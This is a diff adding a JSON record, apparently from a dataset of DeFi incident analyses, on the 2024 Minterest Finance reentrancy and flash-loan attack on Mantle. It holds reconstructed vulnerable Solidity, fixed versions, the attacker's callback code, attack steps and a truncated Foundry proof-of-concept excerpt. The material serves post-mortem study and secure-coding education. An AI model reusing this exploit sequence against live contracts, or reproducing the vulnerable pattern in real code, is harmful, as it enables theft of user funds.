@@ -1,0 +1,44 @@
+{
+ "id": "2024__2024-07-14_MinterestFinance_Reentrancy_Mantle",
+ "source_file": "2024/2024-07-14_MinterestFinance_Reentrancy_Mantle.md",
+ "title": "Minterest Finance — Reentrancy Attack Analysis",
+ "date": "2024-07-14",
+ "protocol": "Minterest Finance",
+ "chain": "Mantle",
+ "loss_raw": "~$1,400,000 (per Halborn and Minterest post-mortem)",
+ "loss_usd": 1400000.0,
+ "root_cause": "`liquidateBorrow` → attacker callback → reentrancy inflating mUSDY collateral",
+ "attack_tx": "0xb3c4...6bd",
+ "vulnerable_contract": "0xe38E...340 (Minterest liquidation contract)",
+ "classes": [
+  "flash-loan",
+  "reentrancy"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code (estimated reconstruction)\n// Minterest liquidation contract (0xe38E3a804eF845e36F277D86Fb2b24b8C32B3340)\n\nfunction liquidateBorrow(\n    address borrower,\n    uint256 repayAmount,\n    address mTokenCollateral\n) external returns (uint256) {\n    // ... liquidation condition checks ...\n\n    // ❌ Issue 1: External call occurs before state update\n    // If borrower is a contract, callback is triggered at this point\n    uint256 seizeTokens = comptroller.liquidateCalculateSeizeTokens(\n        address(this), address(mTokenCollateral), repayAmount\n    );\n\n    // ❌ Issue 2: Inside liquidateSeize, a callback is made to the liquidator (msg.sender)\n    // Attacker fallback() → myFunction() → flash loan loop executes\n    require(\n        MToken(mTokenCollateral).seize(liquidator, borrower, seizeTokens) == NO_ERROR,\n        \"token seizure failed\"\n    );\n\n    // ❌ State update comes after external call — stale state at reentrancy point\n    accountBorrows[borrower].principal = vars.accountBorrowsNew;\n    accountBorrows[borrower].interestIndex = borrowIndex;\n    totalBorrows = vars.totalBorrowsNew;\n\n    emit RepayBorrow(...);\n    emit LiquidateBorrow(...);\n    return NO_ERROR;\n}",
+  "// ❌ Vulnerable code (estimated)\n// musdy contract (0x5edBD8808F48Ffc9e6D4c0D6845e0A0B4711FD5c)\n\nfunction lendRUSDY(uint256 _rUsdyLendAmount) external {\n    // ❌ No reentrancy lock — can be called repeatedly inside flash loan callback\n    // ❌ Only validates user balance, no cap on total collateral supply\n    IERC20(rUSDY).transferFrom(msg.sender, address(this), _rUsdyLendAmount);\n    _mint(msg.sender, _rUsdyLendAmount);  // Mint mUSDY — register collateral\n}",
+  "// Attacker contract's onFlashLoan callback\nfunction onFlashLoan(\n    address initiator,\n    address token,\n    uint256 amount,\n    uint256 fee,\n    bytes calldata data\n) external returns (bytes32) {\n    // Wrap USDY received from flash loan into mUSD (decreasing amount each callback: ~383 USDY)\n    musd.wrap(wrapAmount);                           // USDY → mUSD\n    wrapAmount -= 383_885_212_760_249_758;           // Adjust wrap amount for next round\n\n    uint256 thisamount = musd.balanceOf(address(this));\n    musdy.lendRUSDY(thisamount);                     // mUSD → add mUSDY collateral\n    // ❌ Liquidation contract state is incomplete at this point — collateral accumulation is allowed\n\n    return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — CEI pattern compliance + ReentrancyGuard applied\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract MToken is ReentrancyGuard {\n    function liquidateBorrow(\n        address borrower,\n        uint256 repayAmount,\n        address mTokenCollateral\n    ) external nonReentrant returns (uint256) {\n        // ✅ Fix 1: Update state first (Checks-Effects-Interactions)\n        accountBorrows[borrower].principal = vars.accountBorrowsNew;\n        accountBorrows[borrower].interestIndex = borrowIndex;\n        totalBorrows = vars.totalBorrowsNew;\n\n        // ✅ Fix 2: Events also emitted after state update\n        emit RepayBorrow(...);\n\n        // ✅ Fix 3: External call last (reentrancy blocked by nonReentrant)\n        require(\n            MToken(mTokenCollateral).seize(liquidator, borrower, seizeTokens) == NO_ERROR,\n            \"token seizure failed\"\n        );\n\n        emit LiquidateBorrow(...);\n        return NO_ERROR;\n    }\n}",
+  "// ✅ Fixed code\n\nfunction lendRUSDY(uint256 _rUsdyLendAmount) external nonReentrant {\n    // ✅ Record balance before transfer (guard against fee-on-transfer tokens)\n    uint256 balanceBefore = IERC20(rUSDY).balanceOf(address(this));\n    IERC20(rUSDY).transferFrom(msg.sender, address(this), _rUsdyLendAmount);\n    uint256 actualAmount = IERC20(rUSDY).balanceOf(address(this)) - balanceBefore;\n\n    // ✅ Mint based on actual received amount\n    _mint(msg.sender, actualAmount);\n}"
+ ],
+ "steps": [
+  "- Pre-attack token approvals: USDY → musdy, USDY → musd, musd → musdy, musdy → musdy (unlimited)",
+  "1. enableAsCollateral([musdy])",
+  "→ Register mUSDY collateral at Proxy (0xe53a...32D)",
+  "2. Call liquidateBorrow (selector: 0x490e6cbc)",
+  "→ Enter vulncontract (0xe38E...340) liquidation contract",
+  "seize() called → callback to attacker contract",
+  "Attacker fallback() → enter myFunction()",
+  "USDY → mUSD conversion",
+  "mUSD → add mUSDY collateral (cumulative)",
+  "24-round loop complete: large mUSDY collateral accumulated",
+  "mWETH.borrow(223 ether) → Steal 223 WETH loans",
+  "mMETH.borrow(204 ether) → Steal 204 mETH loans"
+ ],
+ "other_code": [
+  "Attacker (0x618f...11d1)\n    │\n    │  Contract deployment + execution (single Tx)\n    ▼\nOuter attack contract (0x5fda...4d2d)\n    │\n    │  1. enableAsCollateral([musdy])\n    │     → Register mUSDY collateral at Proxy (0xe53a...32D)\n    │\n    │  2. Call liquidateBorrow (selector: 0x490e6cbc)\n    │     → Enter vulncontract (0xe38E...340) liquidation contract\n    │\n    ▼\nVulnerable contract: liquidateBorrow()\n    │\n    │  [External call occurs with state not yet updated]\n    │\n    │  seize() called → callback to attacker contract\n    │\n    ▼\nAttacker fallback() → enter myFunction()\n    │\n    │  initializeWrapAmount(4_265_037_756_531_702_250_012_049)\n    │\n    │  ┌─────────────────────────────────────────────────┐\n    │  │  Flash loan loop (i = 0 ~ 23, total 24 rounds)  │\n    │  │             ",
+  "// SPDX-License-Identifier: UNLICENSED\n// DeFiHackLabs PoC — Core attack logic excerpt with English comments added\n\n// [Step 0] Initial setup\nfunction setUp() public {\n    // Fork from Mantle block 66_416_576 (just before the attack)\n    cheats.createSelectFork(\"mantle\", 66_416_576);\n}\n\n// [Step 1] Attack begins\nfunction testExpolit() public {\n    // 1-A: Unlimited token approvals — allow conversion between USDY, mUSD, mUSDY\n    usdy.approve(address(musdy), type(uint256).max);\n    usdy.approve(address(musd),  type(uint256).max);\n    musd.approve(address(musdy), type(uint256).max);\n    musdy.approve(address(musdy), type(uint256).max);\n\n    // 1-B: Register mUSDY as collateral asset\n    address[] memory addressArray = new address[](1);\n    addressArray[0] = address(musdy);\n    address(Proxy)"
+ ]
+}
